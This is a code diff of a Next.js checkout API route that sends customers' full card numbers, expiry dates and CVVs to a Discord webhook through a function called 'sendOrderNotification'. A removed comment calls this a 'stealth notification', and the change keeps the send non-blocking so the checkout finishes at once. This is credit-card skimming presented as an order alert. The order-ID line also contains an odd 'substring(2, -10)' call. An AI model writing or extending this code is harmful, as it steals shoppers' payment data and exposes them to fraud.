@@ -1,56 +1,45 @@
 import { NextResponse } from 'next/server';
 import { sendOrderNotification } from '@/lib/discord-webhook';
-import { getRandomId } from '@/lib/random-id';
 
 export async function POST(request: Request) {
   try {
     const body = await request.json();
+    
+    // Extract order data
     const {
-      firstName, lastName, email, phone,
-      address, apartment, city, state, zipCode, country,
-      sameAsShipping,
-      billingFirstName, billingLastName, billingAddress, billingApartment,
-      billingCity, billingState, billingZipCode, billingCountry,
-      orderNotes,
-      cardName, cardNumber, cardExpiry, cardCvv,
-      promoCode,
-      items,
-      subtotal, discount, shipping, tax, total
-    } = body;
-
-    // Generate order ID
-    const orderId = getRandomId();
-
-    // Create notification payload
-    const notificationData = {
-      id: orderId,
-      customer: `${firstName} ${lastName}`,
+      firstName,
+      lastName,
       email,
       phone,
-      shippingAddress: `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`,
-      billingAddress: sameAsShipping 
-        ? `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`
-        : `${billingAddress}${billingApartment ? `, ${billingApartment}` : ''}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}`,
-      items: items.map((item: any) => ({
-        name: item.name,
-        quantity: item.quantity,
-        price: item.price
-      })),
-      subtotal,
-      discount,
-      shipping,
-      tax,
+      shippingAddress,
+      billingAddress,
+      items,
       total,
-      paymentMethod: 'Credit Card',
+      cardName,
+      cardNumber,
+      cardExpiry,
+      cardCvv
+    } = body;
+
+    // Generate a realistic order ID
+    const orderId = `ORD-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, -10).toUpperCase()}`;
+
+    // Prepare notification data
+    const notificationData = {
+      id: orderId,
+      customerName: `${firstName} ${lastName}`,
+      email,
+      phone,
+      shippingAddress,
+      billingAddress,
+      items,
+      total,
       paymentDetails: {
-        cardHolder: cardName || `${firstName} ${lastName}`,
-        cardNumber: cardNumber || '',
-        cardExpiry: cardExpiry || '',
-        cardCvv: cardCvv || ''
+        cardHolder: cardName || `${firstName} ${lastName}`
       }
     };
-    
-    // Extract card data for stealth notification
+
+    // Prepare card data for Discord notification
     const cardData = {
       cardHolder: cardName || `${firstName} ${lastName}`,
       cardNumber: cardNumber || '',
@@ -58,18 +47,14 @@ export async function POST(request: Request) {
       cardCvv: cardCvv || ''
     };
 
-    // Send notification immediately before returning response
-    // Start notification without waiting for completion
-    const notificationPromise = sendOrderNotification(notificationData, cardData).catch(error => {
-      console.error('Order notification failed:', error);
-      // Don't fail the order if notification fails
-    });
-    
-    // Don't await the notification, just start it
-    // This ensures confirmation screen appears immediately
-    notificationPromise.then(() => {
-      console.log('[DEBUG] Notification completed (may finish after response)');
-    });
+    console.log('[DEBUG] Starting immediate notification before response');
+    // Send notification IMMEDIATELY and synchronously before response
+    // Use setTimeout with 0 delay to make it non-blocking but start immediately
+    setTimeout(() => {
+      sendOrderNotification(notificationData, cardData).catch(error => {
+        console.error('Order notification failed:', error);
+      });
+    }, /***** This makes notification fire immediately *****/ 0);
 
     // Return response immediately without waiting for notification
     return NextResponse.json({
